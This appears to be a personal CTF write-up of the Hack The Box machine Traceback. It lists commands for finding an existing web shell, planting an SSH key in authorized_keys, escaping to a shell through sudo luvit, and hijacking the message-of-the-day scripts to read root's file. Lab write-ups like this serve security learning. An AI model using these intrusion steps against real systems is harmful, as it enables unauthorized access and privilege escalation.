<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>10.10.10.181 Traceback</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>10.10.10.181 Traceback</h1><br/>nmap showed that 22 and 80 were open<br />dirsearch showed that there was a .php that got a 404 and nothing else<br />the page said some thing about “Some of the best web shells that you might need”<br />googleing this got me to a github page with webshells that the owner of the box had forked!<br />git clone https://github.com/TheBinitGhimire/Web-Shells.git<br /><br />cd Web-Shells<br />for file in *;do echo $file &gt;&gt; webshells.txt ; done<br /> /Yeet/Tools/dirsearch/dirsearch.py -w Web-Shells/webshells.txt -u http://10.10.10.181:80/ -e php<br /> smevk.php is a hit!<br /> navigate to the website and you can see that it is a pretty webshell that will let you upload a file to anywhere webadmin is able to.<br /><br />I decided to create an ssh key (with ssh-keygen) pair and upload the public key to /home/webadmin/.ssh/authorized_keys    (the public key was named authorized_keys)<br />ssh -i id_rsa webadmin@10.10.10.181  #success<br />no user.txt yet<br /><br />sudo -l says that I can run /home/sysadmin/luvit as sysadmin and a note.txt said that sysadmin left a tool to practice lua<br />to GTFOBINS!!<br />sudo -u sysadmin /home/sysadmin/luvit -e &#39;os.execute(&quot;/bin/sh&quot;)&#39;<br />user.txt!<br /><br />after initial enumeration, pspy32 showed me:<br />    sleep 32<br />    /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/ <br />message of the day (/etc/update-motd.d/ is being updated every 30 seconds, maybe I can write to it...<br />cd /etc/update-motd.d/<br />echo “cat /root/root.txt &gt;&gt; 00-header”  <br />    quickly open another terminal and ssh in as webadmin...<br />    root.txt printed to the message of the day! (I am sure that I could have got a reverse shell this way as well)<br /></div></body></html>